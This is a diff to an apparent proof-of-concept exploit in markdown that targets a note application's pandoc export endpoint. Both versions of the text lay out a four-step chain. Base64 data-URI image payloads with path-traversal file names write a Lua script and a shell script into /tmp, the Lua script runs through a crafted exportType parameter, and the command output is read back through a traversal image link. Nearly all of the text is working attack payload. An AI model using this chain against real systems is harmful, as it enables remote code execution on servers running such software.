@@ -1,9 +1,14 @@
-# Write os.execute("/bin/bash /tmp/a.sh"); to /tmp/a.lua
-![](data://image/png;base64,b3MuZXhlY3V0ZSgiL2Jpbi9iYXNoIC90bXAvYS5zaCIpOw==;.lua%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2Ftmp%2fa%2elua)
+# Step 1: Write os.execute("/bin/bash /tmp/a.sh"); to /tmp/a.lua
+in note: ![](data://image/png;base64,b3MuZXhlY3V0ZSgiL2Jpbi9iYXNoIC90bXAvYS5zaCIpOw==;.lua%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2Ftmp%2fa%2elua)
+/note_id/pandoc?exportType=pdf
 
-# Write command "id > /tmp/1" to a.sh
-![](data://image/png;base64,aWQgID4gL3RtcC8xIA==;.lua%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2Ftmp%2fa%2esh)
+# Step 2: Write command "id > /tmp/1" to a.sh
+in note: ![](data://image/png;base64,aWQgID4gL3RtcC8xIA==;.lua%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2Ftmp%2fa%2esh)
+/note_id/pandoc?exportType=pdf
 
-# run /tmp/a.lua
+# Step 3: run /tmp/a.lua
+/note_id/pandoc?exportType=/tmp/a.lua
 
-# read /tmp/1 to get result
+# Step 4: read /tmp/1 to get result
+in note: ![](../../../../../../tmp/1)
+/note_id/pandoc?exportType=ipynb
